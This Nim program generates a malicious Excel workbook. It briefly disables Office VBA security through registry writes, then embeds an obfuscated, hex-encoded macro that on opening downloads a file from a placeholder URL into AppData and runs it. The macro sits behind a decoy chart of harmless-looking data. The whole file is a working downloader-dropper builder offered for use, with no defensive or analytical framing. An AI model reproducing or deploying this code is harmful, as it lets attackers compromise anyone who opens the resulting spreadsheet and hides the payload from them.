import strformat
import winim/com
import os

let xlfilename = paramStr(1)
comScript:
    var objExcel = CreateObject("Excel.Application")
    var WshShell = CreateObject("WScript.Shell") 
    var Application_Version = objExcel.Version
   
    var strVBOMRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AccessVBOM"
    var strVBAWarnRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\VBAWarnings"
    WshShell.RegWrite(strVBOMRegPath, 1, "REG_DWORD")
    WshShell.RegWrite(strVBAWarnRegPath, 1, "REG_DWORD")
    objExcel.visible = false
    objExcel.sheetsInNewWorkBook = 1 
    objExcel.displayalerts = false 
    var objWorkbook = objExcel.workbooks.add()
    var xlmodule = objWorkbook.VBProject.VBComponents(objWorkbook.CodeName)
    var strMacroRevShell = """
Const nttlhoxkct = 2
Const iiteeob = 1
Const wibykrztfufyal = 0
#If VBA7 Then
Private Declare PtrSafe Function jdyrkvwyjssyrfrtgo Lib "urlmon" Alias "URLDownloadToFileA" (ByVal nfzikibxsdvo As Long, _
ByVal nfyeruzflbcyhef As String, ByVal amceoykkquja As String, ByVal estmiwpcwa As Long, _
ByVal phlqgkhyboalui As Long) As Long
#Else
Private Declare Function jdyrkvwyjssyrfrtgo Lib "urlmon" Alias "URLDownloadToFileA" (ByVal nfzikibxsdvo As Long, _
ByVal nfyeruzflbcyhef As String, ByVal amceoykkquja As String, ByVal estmiwpcwa As Long, _
ByVal phlqgkhyboalui As Long) As Long
#End If

Sub Workbook_Open()
spath = CreateObject(ealdczqdfdpyamq("5753637269") & ealdczqdfdpyamq("70742e5368656c6c")).SpecialFolders(ealdczqdfdpyamq("4170706461") & ealdczqdfdpyamq("7461"))
x = jdyrkvwyjssyrfrtgo(wibykrztfufyal, ealdczqdfdpyamq("URLREPLACE") , spath & ealdczqdfdpyamq("FileREPLACE"), wibykrztfufyal, wibykrztfufyal)
Set ryrsjwtpvcgqbhrko = CreateObject(ealdczqdfdpyamq("57536372697074") & ealdczqdfdpyamq("2e5368656c6c"))
ryrsjwtpvcgqbhrko.Exec (spath & ealdczqdfdpyamq("FileREPLACE"))
End Sub
Function ealdczqdfdpyamq(ByVal idxsvoije As String) As String
Dim tvcdiaakpb As Long
For tvcdiaakpb = 1 To Len(idxsvoije) Step 2
ealdczqdfdpyamq = ealdczqdfdpyamq & Chr$(Val("&H" & Mid$(idxsvoije, tvcdiaakpb, 2)))
Next tvcdiaakpb
End Function
    """

    xlmodule.CodeModule.AddFromString(strMacroRevShell)
    objExcel.activeSheet.name = "crypyt"
    for i, j in ["Sing", "Jump", "RAP", "Basketball", "MuSIC"]:
        objExcel.activeSheet.cells(1, i + 1) = j


    for cell in objExcel.activeSheet.range("A1:E1"):
        cell.interior.color = RGB(0Xee, 0xdd, 0x82)
        cell.interior.pattern = 1
        cell.font.size = 17       
        cell.borders.color = RGB(0, 0, 0)
        cell.borders.lineStyle = 1
        cell.borders.weight = 2
    
    var sheet = objExcel.activeSheet
    sheet.range("A2").value = 184
    sheet.range("B2").value = 182   
    sheet.range("C2").value = 57
    sheet.range("D2").value = 162
    sheet.range("F2").value = 1276
    sheet.range("A4:E4").merge()
    sheet.range("A4").value = "SOURCE: ji ni tai mei"
    sheet.range("A1:E2").borderAround(1, 2, nil.variant, RGB(0, 0, 0))
    sheet.columns("A:E").columnWidth = 12.5
    
    var xrang = objExcel.activeSheet.range("A1:E2")
    var xchart = objWorkbook.charts.add()
    xchart.chartWizard(xrang, -4100, 7, 1, 1, 0, false, "Practice for two half years")
    xchart.HasAxis(3) = false
    objWorkbook.SaveAs(xlfilename,FileFormat:=56,Password:="",WriteResPassWord:="",ReadOnlyRecommended:=FALSE,CreateBackup:=0,AccessMode:=1,ConflictResolution:=3,AddToMru:=0,TextCodepage:=0,TextVisualLayout:=0,Local:=0)
    WshShell.RegWrite(strVBOMRegPath, 0, "REG_DWORD")
    WshShell.RegWrite(strVBAWarnRegPath, 0, "REG_DWORD")
    objExcel.DisplayAlerts = false
    objWorkbook.Close(false)
    COM_FullRelease()




